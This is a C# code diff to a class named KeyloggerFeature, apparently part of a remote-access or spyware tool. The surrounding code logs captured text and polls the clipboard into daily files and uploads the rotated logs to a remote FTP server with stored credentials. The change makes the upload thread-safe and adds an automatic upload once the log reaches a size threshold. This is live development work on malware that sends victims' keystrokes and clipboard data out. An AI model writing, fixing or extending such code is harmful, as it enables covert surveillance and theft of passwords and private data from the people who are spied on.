@@ -101,7 +101,7 @@ internal static class KeyloggerFeature
     private static string?  _ftpPath          = "/";
     private static int      _maxSizeKb;
     private static volatile bool _clipboardEnabled;
-    private static volatile bool _uploadInProgress;
+    private static int           _uploadFlag;   // 0=idle 1=in-progress; only via Interlocked
     private static string   _lastClip         = string.Empty;
     private static Func<string, string, string, int, Task>? _ftpStatusCb;
     private static readonly System.Timers.Timer _clipTimer = new(500) { AutoReset = true };
@@ -150,6 +150,7 @@ internal static class KeyloggerFeature
             {
                 Directory.CreateDirectory(_logDir);
                 File.AppendAllText(TodayFile, text, Encoding.UTF8);
+                CheckSizeThreshold();
             }
             catch { }
         }
@@ -242,7 +243,7 @@ internal static class KeyloggerFeature
 
     private static void CheckSizeThreshold()
     {
-        if (_maxSizeKb <= 0 || string.IsNullOrEmpty(_ftpHost) || _uploadInProgress) return;
+        if (_maxSizeKb <= 0 || string.IsNullOrEmpty(_ftpHost) || _uploadFlag != 0) return;
         try
         {
             var today = TodayFile;
@@ -263,8 +264,7 @@ internal static class KeyloggerFeature
 
     private static async Task RotateAndUploadAsync()
     {
-        if (_uploadInProgress) return;
-        _uploadInProgress = true;
+        if (Interlocked.CompareExchange(ref _uploadFlag, 1, 0) != 0) return;
         try
         {
             var rotated = RotateLog();
@@ -294,7 +294,7 @@ internal static class KeyloggerFeature
                 }
             }
         }
-        finally { _uploadInProgress = false; }
+        finally { Interlocked.Exchange(ref _uploadFlag, 0); }
     }
 
     private static async Task FtpUploadAsync(string localPath, string host, int port, string user, string pass, string remotePath)
